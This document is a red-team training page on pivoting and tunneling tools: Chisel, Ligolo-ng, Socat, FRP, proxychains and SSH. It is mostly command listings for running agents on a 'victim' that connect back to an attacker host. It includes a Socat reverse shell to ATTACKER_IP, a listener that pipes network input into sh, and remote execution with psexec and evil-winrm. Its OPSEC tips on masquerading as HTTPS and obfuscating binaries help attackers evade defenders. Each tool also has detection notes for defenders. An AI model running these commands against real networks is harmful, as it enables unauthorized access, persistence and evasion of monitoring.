---
layout: training-page
title: "Network & Pivoting Tools — Red Team Academy"
module: "Red Team Tools"
tags:
  - pivoting
  - tunneling
  - network
  - proxy
page_key: "tools-network"
render_with_liquid: false
---

# Network & Pivoting Tools

Tools for establishing tunnels, pivoting through network segments, and creating SOCKS proxies
    to route attack traffic through compromised hosts. Essential for reaching segmented internal networks.

 CHISEL 

## // Chisel

Fast TCP/UDP tunnel over HTTP with WebSocket support. Single binary — same binary acts as server or client. Widely used for creating SOCKS5 proxies through firewalls. Written in Go, easy to obfuscate with Garble.

### Install

```
go install github.com/jpillora/chisel@latest
# Or download pre-compiled binary from GitHub releases
```

### Common Usage

```
# Setup: Attacker runs server
chisel server --port 8080 --reverse --socks5

# Victim: connect back to attacker, create SOCKS proxy
chisel client ATTACKER_IP:8080 R:socks

# Now route traffic through SOCKS5 via proxychains
# Edit /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -p 22,80,443 192.168.10.0/24

# Forward specific port through tunnel
# On attacker server:
chisel server --port 8080 --reverse

# On victim (forward local 3389 to attacker port 13389)
chisel client ATTACKER_IP:8080 R:13389:127.0.0.1:3389

# Then RDP from attacker:
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:'Pass123'

# Multi-hop (victim1 → victim2 → target)
# On attacker: chisel server --reverse --socks5
# On victim1: chisel client ATTACKER:8080 R:socks
# On victim2 (via proxychains): chisel client VICTIM1:9090 R:socks
```

### Detections

- Chisel uses HTTP/WebSocket — looks like web traffic but has distinctive WebSocket upgrade pattern
- Network: HTTP keepalive connections with unusual duration and data volume
- JA3/JA3S TLS fingerprint: Chisel's Go HTTP client has a recognizable TLS fingerprint
- Firewall: WebSocket upgrade requests to non-browser processes
- EDR: Unusual network connections from non-web processes (e.g., cmd.exe → port 8080)

**OPSEC:** Route over port 443 with --tls-cert/--tls-key to masquerade as HTTPS. Use Garble to obfuscate the binary. Run as a service or from a legitimate process context.

---

 LIGOLO-NG 

## // Ligolo-ng

Advanced tunneling tool using a TUN interface. Unlike Chisel (SOCKS proxy), Ligolo-ng creates a virtual network interface on your attack box — tools work natively without proxychains. Supports multiple agents, UDP, and ICMP tunneling.

### Install

```
# Download proxy (attacker) and agent (victim) from GitHub releases
# https://github.com/nicocha30/ligolo-ng/releases

# Or build
git clone https://github.com/nicocha30/ligolo-ng
cd ligolo-ng
go build -o proxy cmd/proxy/main.go
GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go
```

### Setup

```
# Step 1: Create TUN interface on attacker (Linux)
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# Step 2: Start proxy (attacker)
./proxy -selfcert -laddr 0.0.0.0:11601

# Step 3: Run agent on victim (Windows or Linux)
agent.exe -connect ATTACKER_IP:11601 -ignore-cert
# or Linux: ./agent -connect ATTACKER_IP:11601 -ignore-cert

# Step 4: In ligolo-ng console
ligolo-ng » session               # list connected agents
ligolo-ng » 1                     # select agent
[Agent: VICTIM\user] » ifconfig   # view victim network interfaces
[Agent: VICTIM\user] » start      # start tunnel

# Step 5: Add route to internal network via ligolo interface
sudo ip route add 10.10.10.0/24 dev ligolo

# Now all traffic to 10.10.10.0/24 routes through victim!
nmap -sV 10.10.10.5   # no proxychains needed

# Port forwarding (access service on victim's localhost)
[Agent: VICTIM\user] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:3389
# Now connect to ATTACKER:1234 → victim's 3389
```

### Detections

- TLS connection from victim to attacker on unusual port (11601 default)
- Network flow: sustained long-lived TLS connection with bidirectional data transfer
- EDR: process making outbound connections encapsulating internal network traffic
- Certificate: self-signed cert (--selfcert) — TLS inspection will see invalid cert chain
- ICMP tunnel mode: unusual ICMP payload sizes detectable by network monitoring

---

 SOCAT 

## // Socat

Multipurpose relay tool — creates bidirectional data channels between almost any combination of: TCP, UDP, Unix sockets, files, stdin. Essential for port forwarding, creating listener redirectors, and passing shells.

### Install

```
sudo apt install socat
# Windows: https://github.com/StudioEtrange/socat-windows or compile from source
```

### Common Usage

```
# Port forward: redirect local 8080 to remote 80
socat TCP-LISTEN:8080,fork TCP:target.internal:80

# Relay: forward all traffic to C2 server (redirector)
socat TCP-LISTEN:443,fork TCP:C2_SERVER:443

# Encrypted relay (TLS)
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,verify=0,fork TCP:C2_SERVER:443

# Reverse shell listener (with TTY)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Connect back (from victim, full PTY)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

# UDP forward
socat UDP-LISTEN:53,fork UDP:8.8.8.8:53

# Create named pipe for shellcode execution
socat TCP-LISTEN:1337,fork EXEC:"bash -c 'cat /dev/stdin | sh'"

# Transfer files
# Sender: socat TCP-LISTEN:4444,fork OPEN:file.txt
# Receiver: socat TCP:SENDER:4444 OPEN:received.txt,create

# SOCKS proxy relay (combine with SSH -D)
ssh -D 1080 user@pivot
socat TCP-LISTEN:1081,fork SOCKS4:127.0.0.1:target:80,socksport=1080
```

### Detections

- Socat creates listening ports — network scanning will discover them
- Process: socat binary connecting to unexpected IPs on unexpected ports
- Sysmon Event 3: network connection from socat process
- EDR: data relay pattern — high throughput TCP connection acting as a proxy

---

 FRP 

## // FRP (Fast Reverse Proxy)

High-performance reverse proxy. Exposes services behind NAT/firewall using a VPS server. Supports TCP, UDP, HTTP, HTTPS, and STCP (encrypted point-to-point). Popular for persistent access and tunneling.

### Install

```
# Download from https://github.com/fatedier/frp/releases
# frps = server, frpc = client
```

### Configuration

```
# frps.toml (server — runs on your VPS)
bindPort = 7000
auth.token = "secret-token-here"
vhostHTTPPort = 80
vhostHTTPSPort = 443

# frpc.toml (client — runs on victim)
serverAddr = "YOUR_VPS_IP"
serverPort = 7000
auth.token = "secret-token-here"

[[proxies]]
name = "rdp"
type = "tcp"
localIP = "127.0.0.1"
localPort = 3389
remotePort = 13389

[[proxies]]
name = "socks"
type = "tcp"
localIP = "127.0.0.1"
localPort = 1080
remotePort = 1080
```

```
# Run server on VPS
./frps -c frps.toml

# Run client on victim
./frpc -c frpc.toml

# Now RDP via VPS:
rdesktop YOUR_VPS_IP:13389
```

### Detections

- FRP uses a custom protocol — network inspection can identify frp traffic
- Sustained outbound TCP to VPS IP on port 7000 (non-standard)
- EDR: frpc process making persistent external connections
- Use port 443 with TLS: frp supports TLS for masquerading as HTTPS

---

 PROXYCHAINS 

## // Proxychains-ng

Forces any TCP connection from any application through a SOCKS4/5 or HTTP proxy chain. Routes tools like Nmap, Impacket, Metasploit through established tunnels. Essential companion to Chisel and SSH SOCKS proxies.

### Install & Configure

```
sudo apt install proxychains-ng
# Edit /etc/proxychains4.conf

# Key settings:
strict_chain          # use all proxies in order (reliable)
# dynamic_chain       # skip dead proxies (more resilient)
proxy_dns             # route DNS through proxy (critical for stealth)

[ProxyList]
socks5 127.0.0.1 1080   # Chisel or SSH tunnel
```

### Common Usage

```
# Route any command through proxy
proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.10.10.5
proxychains ssh user@10.10.10.5
proxychains impacket-psexec domain/admin:'Pass123'@10.10.10.5
proxychains evil-winrm -i 10.10.10.5 -u admin -p 'Pass123'

# Multi-hop chain
[ProxyList]
socks5 127.0.0.1 1080   # first hop (chisel to victim1)
socks5 127.0.0.1 1081   # second hop (chisel through victim1 to victim2)

# DNS over proxy (prevent DNS leaks)
proxychains curl http://internal-server.corp
# proxy_dns in config ensures DNS queries also route through SOCKS
```

### Limitations

- Only works with TCP — UDP and ICMP don't work through proxychains
- Nmap: must use -sT (TCP connect) not -sS (SYN scan requires raw sockets)
- Some tools don't respect LD_PRELOAD (proxychains uses library injection)
- Performance: each hop adds significant latency

---

 SSH TUNNELING 

## // SSH Tunneling

Native SSH features for port forwarding and SOCKS proxies. Uses existing SSH infrastructure — looks like legitimate admin traffic. First choice for stable, long-lived tunnels in environments where SSH is permitted.

### Tunneling Options

```
# Local port forward (access target service via local port)
# ssh -L LOCAL_PORT:TARGET_HOST:TARGET_PORT user@JUMP_HOST
ssh -L 3389:10.10.10.5:3389 user@jump.example.com
# Then: rdesktop 127.0.0.1:3389

# Remote port forward (expose attacker service on victim)
# ssh -R REMOTE_PORT:LOCAL_HOST:LOCAL_PORT user@victim
ssh -R 4444:127.0.0.1:4444 user@victim.corp

# Dynamic SOCKS5 proxy
ssh -D 1080 -N user@pivot.internal
# proxychains through 127.0.0.1:1080

# Multi-hop jump
ssh -J user@jump1.corp,user@jump2.corp user@final.internal

# Persistent tunnel (reconnect on failure)
autossh -M 0 -o "ServerAliveInterval 30" -D 1080 -N user@pivot

# Reverse tunnel with autossh (victim calls back to attacker)
autossh -M 0 -o "StrictHostKeyChecking=no" -R 2222:127.0.0.1:22 user@ATTACKER_IP

# sshuttle (transparent proxy — routes entire subnet through SSH)
sshuttle -r user@pivot.internal 10.10.10.0/24
sshuttle -r user@pivot.internal 0/0  # route ALL traffic (careful!)
```

### Detections

- SSH is expected traffic — blends in unless connection pattern is unusual
- Network: dynamic port forwarding (-D) creates SOCKS proxy — unusual if SSH user normally doesn't do this
- SIEM: long-lived SSH sessions, large data transfer over SSH
- PAM/SSH logs: /var/log/auth.log shows all SSH connections
- EDR: sshuttle creates iptables rules — root activity detectable
